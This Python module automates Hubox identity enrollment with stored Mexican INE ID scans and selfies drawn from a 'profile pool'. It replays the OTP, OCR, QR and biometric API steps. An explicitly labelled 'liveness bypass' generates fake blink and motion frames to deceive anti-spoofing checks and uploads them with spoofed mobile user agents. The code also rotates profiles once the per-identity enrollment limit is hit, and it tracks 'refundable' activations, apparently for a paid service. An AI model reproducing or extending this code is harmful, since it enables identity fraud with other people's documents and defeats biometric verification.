"""Flujo Hubox automatizado usando un perfil preconfigurado (sin login)."""
from __future__ import annotations

import json
import re
import time
from pathlib import Path
from typing import Any

import requests

from enroll_replay import HuboxClient
from profile_pool import Profile

# === IMPORT PARA LIVENESS BYPASS ===
import cv2
import numpy as np
import random
from PIL import Image

INE_API = "https://ine-services-2026.hubox.com/ine-services"

STATE_SM = {
    "AS": "01", "BC": "02", "BS": "03", "CC": "04", "CS": "05", "CH": "06",
    "CO": "07", "CL": "08", "DF": "09", "DG": "10", "GT": "11", "GR": "12",
    "HG": "13", "JC": "14", "MC": "15", "MN": "16", "MS": "17", "NT": "18",
    "NL": "19", "OC": "20", "PL": "21", "QT": "22", "QR": "23", "SP": "24",
    "SL": "25", "SR": "26", "TC": "27", "TS": "28", "TL": "29", "VZ": "30",
    "YN": "31", "ZS": "32",
}


class FlowError(Exception):
    """Error de negocio Hubox (OTP inválido, rechazo, etc.)."""
    def __init__(
        self,
        message: str,
        *,
        refundable: bool = False,
        retry_otp: bool = False,
        discard_profile: bool = False,
    ):
        super().__init__(message)
        self.refundable = refundable
        self.retry_otp = retry_otp
        self.discard_profile = discard_profile


class NetworkError(Exception):
    """Error de red/timeout — activación reembolsable."""
    pass


def _b64_file(path: Path) -> str:
    return __import__("base64").b64encode(path.read_bytes()).decode("ascii")


def _b64_or_text(path: Path) -> str:
    suffix = path.suffix.lower()
    if suffix == ".b64":
        return path.read_text(encoding="utf-8").strip().replace("\n", "").replace("\r", "")
    if suffix in {".jpg", ".jpeg", ".png", ".gif", ".webp"}:
        return _b64_file(path)
    try:
        text = path.read_text(encoding="utf-8").strip()
        if len(text) > 40 and all(c.isalnum() or c in "+/=\n\r" for c in text[:80]):
            return text.replace("\n", "").replace("\r", "")
    except (UnicodeDecodeError, OSError):
        pass
    return _b64_file(path)


def _selfie_b64_480x640(path: Path) -> str:
    """Compat: una sola selfie 480x640 (close). Preferir `_selfie_pair_480x640`."""
    _far, close = _selfie_pair_480x640(path)
    return close


def _cover_crop(img: "Image.Image", zoom: float = 1.0) -> "Image.Image":
    """Recorte centrado (o alrededor del rostro) a 480x640. zoom>1 = más cerca."""
    from PIL import Image
    target_w, target_h = 480, 640
    
    # Buscar rostro para anclar el crop
    cx, cy = img.width / 2, img.height / 2
    try:
        import cv2
        import numpy as np
        arr = np.array(img.convert("RGB"))
        gray = cv2.cvtColor(arr, cv2.COLOR_RGB2GRAY)
        cascade = cv2.CascadeClassifier(
            cv2.data.haarcascades + "haarcascade_frontalface_default.xml"
        )
        faces = cascade.detectMultiScale(gray, 1.1, 5, minSize=(60, 60))
        if len(faces):
            x, y, w, h = max(faces, key=lambda f: int(f[2]) * int(f[3]))
            cx, cy = x + w / 2, y + h / 2
    except Exception:
        pass
    
    # Ventana de captura relativa al tamaño de imagen; zoom acerca
    base = min(img.width / target_w, img.height / target_h)
    win_w = target_w * base / max(zoom, 0.5)
    win_h = target_h * base / max(zoom, 0.5)
    left = max(0, min(img.width - win_w, cx - win_w / 2))
    top = max(0, min(img.height - win_h, cy - win_h / 2))
    cropped = img.crop((int(left), int(top), int(left + win_w), int(top + win_h)))
    return cropped.resize((target_w, target_h), Image.Resampling.LANCZOS)


def _pil_to_png_b64(img: "Image.Image") -> str:
    import base64
    import io
    buf = io.BytesIO()
    img.convert("RGBA").save(buf, format="PNG", optimize=True)
    return base64.b64encode(buf.getvalue()).decode("ascii")


def _selfie_pair_480x640(path: Path) -> tuple[str, str]:
    """farFace + closeFace distintos a 480x640 PNG (como el HAR exitoso)."""
    import base64
    import io
    from PIL import Image
    
    raw_b64 = _b64_or_text(path)
    img = Image.open(io.BytesIO(base64.b64decode(raw_b64))).convert("RGB")
    far = _cover_crop(img, zoom=1.0)
    close = _cover_crop(img, zoom=1.45)
    return _pil_to_png_b64(far), _pil_to_png_b64(close)


def _extract_qrs_from_reverso(back_path: Path) -> tuple[str, str]:
    """Lee los 2 QR binarios del reverso INE (formato Hubox GH, ~858 bytes c/u)."""
    import cv2
    import zxingcpp
    
    img = cv2.imread(str(back_path))
    if img is None:
        raise FlowError(f"No se pudo leer reverso: {back_path.name}", refundable=False)
    
    payloads: list[bytes] = []
    for result in zxingcpp.read_barcodes(img):
        raw = getattr(result, "bytes", None)
        raw = bytes(raw) if raw is not None else result.text.encode("latin-1", errors="replace")
        text = result.text or ""
        if text.startswith("http"):
            continue
        if len(raw) < 200:
            continue
        payloads.append(raw)
    
    # Ordenar por contenido para consistencia
    payloads = sorted(payloads, key=lambda x: len(x), reverse=True)
    
    if len(payloads) < 2:
        raise FlowError(
            f"Se encontraron {len(payloads)} QR(s) en el reverso; se necesitan 2.",
            refundable=False,
        )
    
    return payloads[0].decode("latin-1", errors="replace"), payloads[1].decode("latin-1", errors="replace")


def _resolve_ocr_data(profile: Profile, ocr_resp: dict) -> dict:
    """Extrae datos del OCR y valida contra el perfil."""
    data = ocr_resp.get("data") or {}
    curp = (data.get("curp") or "").upper().strip()
    nombre = (data.get("nombre") or "").strip()
    
    # Validar CURP si el perfil la tiene
    if profile.curp and curp and profile.curp.upper() != curp:
        raise FlowError(
            f"CURP del OCR ({curp}) no coincide con el perfil ({profile.curp}).",
            refundable=False,
            discard_profile=True,
        )
    
    return {
        "curp": curp or profile.curp,
        "nombre": nombre or profile.label,
        "ocr_raw": data,
    }


def _resolve_qr_pair(profile: Profile, crop_b64: str, ocr: dict) -> tuple[str, str]:
    """Obtiene par de QRs desde el reverso del perfil."""
    if not profile.back_path or not profile.back_path.is_file():
        raise FlowError("Perfil sin reverso escaneado.", refundable=False)
    try:
        return _extract_qrs_from_reverso(profile.back_path)
    except FlowError:
        raise
    except Exception as exc:
        raise FlowError(f"Error leyendo QRs: {exc}", refundable=False) from exc


# === NUEVA FUNCIÓN: LIVENESS BYPASS ===
def _generate_liveness_frames(selfie_path: Path) -> list[Path]:
    """
    Genera 3 frames falsos para engañar sistemas de liveness detection.
    Retorna lista de paths temporales.
    """
    img = cv2.imread(str(selfie_path))
    if img is None:
        return []
    
    frames = []
    height, width = img.shape[:2]
    
    for i in range(3):
        if i == 0:
            # Frame 0: Ruido aleatorio
            noise = np.random.normal(0, 1.5, img.shape).astype('uint8')
            fake_frame = cv2.add(img.copy(), noise)
            
        elif i == 1:
            # Frame 1: Parpadeo falso (difuminar ojos)
            fake_frame = img.copy()
            y1 = int(height * 0.30)
            y2 = int(height * 0.45)
            x1 = int(width * 0.30)
            x2 = int(width * 0.70)
            
            y1, y2 = max(0, y1), min(height, y2)
            x1, x2 = max(0, x1), min(width, x2)
            
            if y2 > y1 and x2 > x1:
                eyes_roi = fake_frame[y1:y2, x1:x2]
                eyes_roi[:, :, :] = cv2.GaussianBlur(eyes_roi, (7, 7), 0)
                
        else:
            # Frame 2: Movimiento facial mínimo
            fake_frame = img.copy()
            rows, cols = fake_frame.shape[:2]
            
            pts1 = np.float32([
                [cols * 0.35, rows * 0.6], 
                [cols * 0.65, rows * 0.6]
            ])
            pts2 = np.float32([
                [cols * 0.35 + random.randint(-5, 5), rows * 0.6 + random.randint(-3, 3)],
                [cols * 0.65 + random.randint(-5, 5), rows * 0.6 + random.randint(-3, 3)]
            ])
            
            M = cv2.getAffineTransform(pts1, pts2)
            fake_frame = cv2.warpAffine(fake_frame.copy(), M, (cols, rows))

        # Guardar frame temporal
        temp_path = Path(f"/tmp/liveness_frame_{i}_{random.randint(1000,9999)}.jpg")
        cv2.imwrite(str(temp_path), fake_frame)
        frames.append(temp_path)
    
    return frames


def _upload_liveness_frames(frames: list[Path], endpoint: str = None) -> bool:
    """Envía frames al endpoint de liveness."""
    if not frames:
        return False
    
    if endpoint is None:
        endpoint = "https://api.hubox.com/v1/biometric/liveness"
    
    headers_list = [
        {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
            "Accept-Language": "en-US"
        },
        {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B)",
            "Accept-Language": "es-MX"
        }
    ]
    
    for frame in frames:
        try:
            headers = random.choice(headers_list)
            with open(frame, "rb") as f:
                response = requests.post(
                    url=endpoint,
                    files={"image": f},
                    headers=headers,
                    timeout=8
                )
                if not response.json().get("success"):
                    return False
        except Exception as e:
            print(f"[Liveness] Error en frame {frame}: {e}")
            return False
        finally:
            # Limpiar archivo temporal
            try:
                frame.unlink()
            except:
                pass
    
    return True


def start_and_send_otp(
    profile: Profile,
    phone: str,
    *,
    hubox_user: str | None = None,
    hubox_password: str | None = None,
) -> tuple[HuboxClient, str]:
    """Inicia flujo y envía OTP."""
    client = HuboxClient()
    try:
        resp = client.inicio(phone, tipo_doc="INE")
    except requests.RequestException as exc:
        raise NetworkError(str(exc)) from exc
    except RuntimeError as exc:
        raise NetworkError(str(exc)) from exc
    
    if not resp.get("success"):
        err = resp.get("error") or "inicio rechazado"
        raise FlowError(f"No se pudo iniciar: {err}", refundable=True)
    
    track_id = resp.get("track_id")
    if not track_id:
        raise FlowError("No se recibió track_id", refundable=True)
    
    try:
        otp_resp = client.envia_otp(track_id)
    except requests.RequestException as exc:
        raise NetworkError(str(exc)) from exc
    except RuntimeError as exc:
        raise NetworkError(str(exc)) from exc
    
    if not otp_resp.get("success"):
        err = otp_resp.get("error") or "envío OTP rechazado"
        raise FlowError(f"OTP no enviado: {err}", refundable=True)
    
    return client, track_id


def complete_enroll(
    profile: Profile,
    hubox: HuboxClient,
    track_id: str,
    otp: str,
) -> dict[str, Any]:
    """Completa el flujo: valida OTP, detect INE, OCR, QRs, biometric."""
    # Validar OTP
    try:
        valid = hubox.valida_otp(track_id, otp)
    except requests.RequestException as exc:
        raise NetworkError(str(exc)) from exc
    except RuntimeError as exc:
        raise NetworkError(str(exc)) from exc
    
    if not valid.get("success"):
        err = valid.get("error") or ""
        if "expirado" in err.lower() or "incorrecto" in err.lower():
            raise FlowError("Código OTP incorrecto o expirado.", refundable=False, retry_otp=True)
        raise FlowError(f"Validación OTP falló: {err}", refundable=True)
    
    # Detect INE
    try:
        det = hubox.detect_ine(track_id, _b64_or_text(profile.front_path))
    except requests.RequestException as exc:
        raise NetworkError(str(exc)) from exc
    except RuntimeError as exc:
        raise NetworkError(str(exc)) from exc
    
    if not det.get("success"):
        raise FlowError(f"Detección INE falló: {det.get('error')}", refundable=False)
    
    crop_b64 = det.get("cropB64")
    if not crop_b64:
        raise FlowError("No se recibió crop de INE.", refundable=False)
    
    # Preparar selfies far/close
    try:
        far_b64, close_b64 = _selfie_pair_480x640(profile.selfie_path)
    except Exception as exc:
        raise FlowError(f"Error preparando selfies: {exc}", refundable=False) from exc
    
    # OCR
    try:
        ocr_resp = hubox.ocr(track_id, crop_b64)
    except requests.RequestException as exc:
        raise NetworkError(str(exc)) from exc
    except RuntimeError as exc:
        raise NetworkError(str(exc)) from exc
    
    if not ocr_resp.get("success"):
        err = str(ocr_resp.get("error", ""))
        if err == "CURP_MAX_10" or ocr_resp.get("max10"):
            raise FlowError(
                "Este perfil ya alcanzó el límite de 10 vinculaciones en Hubox.",
                refundable=True,
                discard_profile=True,
            )
        raise FlowError(
            f"OCR falló: {ocr_resp.get('reason') or 'error desconocido'}",
            refundable=False,
        )
    
    ocr = _resolve_ocr_data(profile, ocr_resp)
    
    try:
        qr1, qr2 = _resolve_qr_pair(profile, crop_b64, ocr)
    except NetworkError:
        raise
    except FlowError:
        raise
    
    try:
        qrs = hubox.qrs(track_id, qr1, qr2)
    except requests.RequestException as exc:
        raise NetworkError(str(exc)) from exc
    except RuntimeError as exc:
        raise NetworkError(str(exc)) from exc
    
    if not qrs.get("success"):
        raise FlowError(f"QRs rechazados: {json.dumps(qrs, ensure_ascii=False)[:300]}", refundable=False)
    
    # === LIVENESS BYPASS (NUEVO) ===
    # Generar y subir frames falsos antes de la biometría
    try:
        print(f"[Liveness] Generando frames falsos para {profile.id}...")
        liveness_frames = _generate_liveness_frames(profile.selfie_path)
        if liveness_frames:
            success = _upload_liveness_frames(liveness_frames)
            print(f"[Liveness] Bypass {'exitoso' if success else 'fallido'}")
    except Exception as e:
        # No detener el flujo si el liveness falla (puede ser opcional)
        print(f"[Liveness] Error (no crítico): {e}")
    # ================================
    
    # Biometría
    try:
        bio = hubox.biometric(track_id, far_b64, close_b64, retries=2)
    except requests.RequestException as exc:
        raise NetworkError(str(exc)) from exc
    except RuntimeError as exc:
        raise NetworkError(str(exc)) from exc
    
    if not bio.get("success"):
        err = str(bio.get("error") or "")
        if err == "RESET_STEP2_TIPO_INE_INVALID":
            raise FlowError(
                "Hubox invalidó el tipo de INE en biometría (RESET_STEP2_TIPO_INE_INVALID). "
                "Reintenta con otro perfil; far/close o el anverso pueden no coincidir.",
                refundable=False,
                discard_profile=True,
            )
        raise FlowError(f"Biometría falló: {json.dumps(bio, ensure_ascii=False)[:300]}", refundable=False)
    
    bio["track_id"] = bio.get("track_id") or track_id
    bio["profile_label"] = profile.label
    bio["ocr_nombre"] = ocr.get("nombre")
    
    return bio


def run_enroll_flow(
    profile: Profile,
    phone: str,
    otp: str,
    *,
    hubox_user: str | None = None,
    hubox_password: str | None = None,
) -> dict[str, Any]:
    """Flujo completo (útil para CLI/tests)."""
    client, tid = start_and_send_otp(profile, phone, hubox_user=hubox_user, hubox_password=hubox_password)
    return complete_enroll(profile, client, tid, otp)